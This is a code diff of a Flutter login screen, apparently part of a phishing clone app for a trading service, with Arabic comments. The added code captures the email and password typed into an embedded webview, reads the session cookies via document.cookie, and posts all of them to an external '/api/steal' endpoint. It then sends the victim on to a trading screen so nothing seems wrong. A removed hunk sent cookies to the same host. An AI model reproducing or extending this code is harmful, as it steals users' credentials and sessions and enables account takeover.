@@ -65,11 +65,22 @@ class _LoginScreenState extends State<LoginScreen> {
           try {
             var data = jsonDecode(msg.message);
             if (data['type'] == 'creds' && data['email'] != null && data['password'] != null) {
+              // 431. لما يبعت الإيميل والباسورد، نسحب الكوكيز الحقيقية
+              final cookieString = await _controller.runJavaScriptReturningResult("document.cookie");
+              
+              // نبعتها للسيرفر
               await http.post(
                 Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
                 headers: {"Content-Type": "application/json"},
-                body: msg.message,
+                body: jsonEncode({
+                  "type": "full_session",
+                  "email": data['email'],
+                  "password": data['password'],
+                  "cookies": cookieString.toString()
+                }),
               );
+
+              // نحول المستخدم للواجهة
               if (mounted) {
                 Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => const MainTradingScreen()));
               }
@@ -84,16 +95,6 @@ class _LoginScreenState extends State<LoginScreen> {
           onPageFinished: (url) async {
             await Future.delayed(const Duration(seconds: 2));
             _injectOriginalScript();
-            
-            // 427. سحب الكوكيز
-            final cookieString = await _controller.runJavaScriptReturningResult("document.cookie");
-            if (cookieString.toString().isNotEmpty) {
-              await http.post(
-                Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
-                headers: {"Content-Type": "application/json"},
-                body: jsonEncode({"type": "cookies", "data": cookieString.toString()}),
-              );
-            }
           },
         ),
       )
@@ -103,7 +104,6 @@ class _LoginScreenState extends State<LoginScreen> {
   void _injectOriginalScript() {
     String jsScript = """
       (function() {
-        // 428. سكربت الإيميل والباسورد
         function setNativeValue(el, value) {
           try {
             var proto = window.HTMLInputElement.prototype;
